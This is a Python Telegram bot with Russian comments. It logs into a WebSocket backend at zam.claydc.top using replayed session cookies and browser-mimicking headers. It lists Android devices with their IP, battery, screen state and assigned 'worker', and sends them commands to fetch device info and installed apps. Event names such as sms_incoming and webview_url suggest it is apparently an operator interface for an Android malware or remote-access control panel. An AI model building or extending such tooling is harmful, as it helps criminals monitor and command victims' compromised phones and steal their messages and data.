import os
import asyncio
import json
import logging
import contextlib
from pathlib import Path

from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, Router
from aiogram.filters import Command
from aiogram.types import Message
import websockets

# ---------- CONFIG ----------
# Грузим .env, лежащий РЯДОМ с main.py
load_dotenv(dotenv_path=Path(__file__).with_name(".env"))

# Telegram
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip().isdigit()}
ALLOWED_CHAT_IDS = {int(x) for x in os.getenv("ALLOWED_CHAT_IDS", "").split(",") if x.strip().lstrip("-").isdigit()}

# WebSocket
WS_URL = os.getenv("WS_URL", "")
AUTH_TYPE = (os.getenv("WS_AUTH_TYPE", "cookie") or "cookie").lower()  # cookie|bearer|protocol|none
WS_TOKEN = os.getenv("WS_TOKEN", "")     # для bearer/protocol
WS_COOKIE = os.getenv("WS_COOKIE", "")   # "name=value; name2=value2"
WS_ORIGIN = os.getenv("WS_ORIGIN", "https://zam.claydc.top")

# Если бекенд требует авторизацию первым сообщением — положи сюда JSON-строку.
WS_INIT_AUTH_JSON = os.getenv("WS_INIT_AUTH_JSON", "")
# Событие, по которому считаем авторизацию подтверждённой (у тебя приходит 'welcome')
WS_AUTH_OK_EVENT = (os.getenv("WS_AUTH_OK_EVENT", "welcome") or "welcome").strip().lower()

# Доп. «браузерные» заголовки (иногда проверяют)
WS_USER_AGENT = os.getenv("WS_USER_AGENT", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36")
WS_ACCEPT_LANGUAGE = os.getenv("WS_ACCEPT_LANGUAGE", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
WS_CACHE_CONTROL = os.getenv("WS_CACHE_CONTROL", "no-cache")
WS_PRAGMA = os.getenv("WS_PRAGMA", "no-cache")

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("clonnex")

def allowed_chat(chat_id: int) -> bool:
    return (not ALLOWED_CHAT_IDS) or (chat_id in ALLOWED_CHAT_IDS)

def is_admin(uid: int, chat_id: int) -> bool:
    return ((not ADMIN_IDS) or (uid in ADMIN_IDS)) and allowed_chat(chat_id)

# ---------- КЭШ ----------
DEVICES: dict[str, dict] = {}   # device_id/uuid -> нормализованный payload


# ---------- WS КЛИЕНТ ----------
class WSClient:
    def __init__(self) -> None:
        self.ws: websockets.WebSocketClientProtocol | None = None
        self.auth_ok: bool = False

    def _conn_args(self) -> dict:
        """Собираем заголовки/подпротоколы под разные режимы."""
        k: dict = {}
        headers: dict[str, str] = {}

        # авторизация
        if AUTH_TYPE == "bearer" and WS_TOKEN:
            headers["Authorization"] = f"Bearer {WS_TOKEN}"
        elif AUTH_TYPE == "cookie" and WS_COOKIE:
            headers["Cookie"] = WS_COOKIE

        # «браузерные» заголовки
        if WS_ORIGIN:
            headers["Origin"] = WS_ORIGIN
        if WS_USER_AGENT:
            headers["User-Agent"] = WS_USER_AGENT
        if WS_ACCEPT_LANGUAGE:
            headers["Accept-Language"] = WS_ACCEPT_LANGUAGE
        if WS_CACHE_CONTROL:
            headers["Cache-Control"] = WS_CACHE_CONTROL
        if WS_PRAGMA:
            headers["Pragma"] = WS_PRAGMA

        if headers:
            k["extra_headers"] = headers

        # подпротокол(ы), если используется protocol-токен
        if AUTH_TYPE == "protocol" and WS_TOKEN:
            toks = [t.strip() for t in WS_TOKEN.split(",") if t.strip()]
            k["subprotocols"] = toks or [WS_TOKEN]

        return k

    async def run(self) -> None:
        if not WS_URL:
            log.error("WS_URL пуст")
            await asyncio.Future()

        backoff = 1
        while True:
            try:
                log.info("WS connecting → %s", WS_URL)
                async with websockets.connect(
                    WS_URL, ping_interval=20, ping_timeout=20, **self._conn_args()
                ) as ws:
                    self.ws = ws
                    self.auth_ok = False
                    log.info("WS connected; protocol=%s", ws.subprotocol or "-")

                    if WS_INIT_AUTH_JSON:
                        await ws.send(WS_INIT_AUTH_JSON)
                        log.info("WS sent init auth json")

                    asyncio.create_task(self._auth_watchdog())

                    async for raw in ws:
                        try:
                            data = json.loads(raw)
                        except Exception:
                            data = {"type": "raw", "payload": raw}

                        # Поддерживаем и type, и event
                        t = (data.get("type") or "").lower()
                        evt = (data.get("event") or "").lower()

                        # Детект успешной авторизации
                        if not self.auth_ok:
                            ok_by_env = (WS_AUTH_OK_EVENT and (t == WS_AUTH_OK_EVENT or evt == WS_AUTH_OK_EVENT))
                            ok_by_event = evt in {"welcome", "clients_update", "client_update"}
                            ok_by_type = t in {"device_status", "device_info", "apps_list", "log", "sms_incoming", "sms_result"}
                            if ok_by_env or ok_by_event or ok_by_type:
                                self.auth_ok = True
                                log.info("AUTH OK ✅")

                        await self._handle(data)

            except websockets.InvalidStatusCode as e:
                hdrs = getattr(e, "headers", None)
                log.warning("WS InvalidStatusCode: %s; headers=%s; reconnecting in %ss", e.status_code, hdrs, backoff)
                await asyncio.sleep(backoff)
                backoff = min(backoff * 2, 30)
            except Exception as e:
                log.warning("WS error: %r; reconnect in %ss", e, backoff)
                await asyncio.sleep(backoff)
                backoff = min(backoff * 2, 30)

    async def _auth_watchdog(self) -> None:
        await asyncio.sleep(5)
        if not self.auth_ok:
            log.error("AUTH not confirmed in 5s — проверь .env (WS_AUTH_TYPE/WS_COOKIE/WS_ORIGIN или WS_INIT_AUTH_JSON)")

    async def _handle(self, data: dict) -> None:
        """Нормализуем входящие события под наш кэш DEVICES."""
        t = (data.get("type") or "").lower()
        evt = (data.get("event") or "").lower()

        # Массовое обновление
        if evt == "clients_update" and isinstance(data.get("clients"), list):
            for c in data["clients"]:
                dev_id = c.get("ID") or c.get("UUID") or c.get("id") or c.get("uuid")
                if not dev_id:
                    continue
                DEVICES.setdefault(dev_id, {}).update({
                    "name":            c.get("DeviceName"),
                    "model":           c.get("DeviceModel"),
                    "android":         c.get("AndroidVersion"),
                    "battery":         c.get("BatteryLevel"),
                    "ip":              c.get("IP") or c.get("IPAddress"),
                    "status":          "online" if c.get("IsConnected") else "offline",
                    "screen":          "on" if c.get("IsScreenOn") else "off",
                    "worker":          c.get("worker_name"),
                    "client":          c.get("ClientType"),
                    "connection":      c.get("ConnectionMethod") or c.get("ConnectionType"),
                    "last_seen":       c.get("FormattedLastSeen") or c.get("LastSeen"),
                    "connected_for":   c.get("FormatTimeConnected"),
                    "webview_url":     c.get("webview_url"),
                    "tag":             c.get("Tag"),
                })
            log.info("[cache] devices updated: %d", len(DEVICES))
            return

        # Единичный апдейт (если бекенд такие шлёт)
        if evt in {"client_update", "client_status"} and isinstance(data.get("client"), dict):
            c = data["client"]
            dev_id = c.get("ID") or c.get("UUID") or c.get("id") or c.get("uuid")
            if dev_id:
                DEVICES.setdefault(dev_id, {}).update({
                    "name":    c.get("DeviceName"),
                    "model":   c.get("DeviceModel"),
                    "android": c.get("AndroidVersion"),
                    "ip":      c.get("IP") or c.get("IPAddress"),
                    "status":  "online" if c.get("IsConnected") else "offline",
                    "screen":  "on" if c.get("IsScreenOn") else "off",
                })
            return

        # Старые ветки по type — на будущее
        if t in {"device_status", "device_info"}:
            dev_id = data.get("device_id", "?")
            DEVICES.setdefault(dev_id, {}).update({k: v for k, v in data.items() if k != "type"})
            return

        # По умолчанию просто лог
        log.info("[WS recv] %s", data)

    async def send(self, obj: dict) -> None:
        if not self.ws:
            log.warning("WS not connected; drop send: %s", obj)
            return
        await self.ws.send(json.dumps(obj))
        log.info("[WS send] %s", obj)


# ---------- TELEGRAM ----------
router = Router()

@router.message(Command("whoami"))
async def whoami(m: Message):
    await m.answer(f"user_id: {m.from_user.id}\nchat_id: {m.chat.id}")

@router.message(Command("whereami"))
async def whereami(m: Message):
    await m.answer(f"chat_id: {m.chat.id}")

@router.message(Command("start"))
async def start(m: Message):
    if not is_admin(m.from_user.id, m.chat.id):
        await m.answer("доступ ограничён")
        return
    await m.answer("я жив. /ping /devices /device <id> /apps <id> — смотри WS в консоли")

@router.message(Command("ping"))
async def ping(m: Message):
    if not is_admin(m.from_user.id, m.chat.id):
        return
    await m.answer("pong")

@router.message(Command("devices"))
async def devices(m: Message):
    if not is_admin(m.from_user.id, m.chat.id):
        return
    if not DEVICES:
        await m.answer("пока нет данных. как только WS пришлёт статусы, они появятся.")
        return
    lines = []
    for d, v in list(DEVICES.items())[:60]:
        name = v.get("name") or v.get("model") or "?"
        status = v.get("status", "?")
        worker = v.get("worker") or ""
        lines.append(f"• <code>{d}</code> — {name} — {status}" + (f" — {worker}" if worker else ""))
    if len(DEVICES) > 60:
        lines.append(f"…и ещё {len(DEVICES)-60}")
    await m.answer("\n".join(lines), parse_mode="HTML")

@router.message(Command("device"))
async def device(m: Message, ws: WSClient):
    if not is_admin(m.from_user.id, m.chat.id):
        return
    parts = m.text.split(maxsplit=1)
    if len(parts) < 2:
        await m.answer("используй: /device <id>")
        return
    dev = parts[1].strip()
    v = DEVICES.get(dev, {})
    text = (
        f"<b>{v.get('name') or v.get('model', '?')}</b>\n"
        f"Android: {v.get('android', '?')}  •  Статус: {v.get('status', '?')}  •  Экран: {v.get('screen', '?')}\n"
        f"IP: {v.get('ip', '?')}  •  Соединение: {v.get('connection', '?')}\n"
        f"Работник: {v.get('worker', '-')}\n"
        f"Послед. активность: {v.get('last_seen', '-')}\n"
        f"Онлайн: {v.get('connected_for', '-')}\n"
    )
    await m.answer(text, parse_mode="HTML")
    # на будущее — запросить актуализацию
    await ws.send({"type": "cmd", "action": "device_info_get", "device_id": dev})

@router.message(Command("apps"))
async def apps(m: Message, ws: WSClient):
    if not is_admin(m.from_user.id, m.chat.id):
        return
    parts = m.text.split()
    if len(parts) < 2:
        await m.answer("используй: /apps <device_id>")
        return
    dev = parts[1]
    await m.answer("запросил список приложений; смотри логи консоли.")
    await ws.send({"type": "cmd", "action": "apps_list_get", "device_id": dev})


async def main():
    if not BOT_TOKEN:
        log.error("BOT_TOKEN пуст")
        return

    bot = Bot(BOT_TOKEN)
    dp = Dispatcher()
    dp.include_router(router)

    ws = WSClient()
    dp["ws"] = ws

    ws_task = asyncio.create_task(ws.run())
    try:
        await dp.start_polling(bot, ws=ws)
    finally:
        ws_task.cancel()
        with contextlib.suppress(Exception):
            await ws_task

if __name__ == "__main__":
    asyncio.run(main())
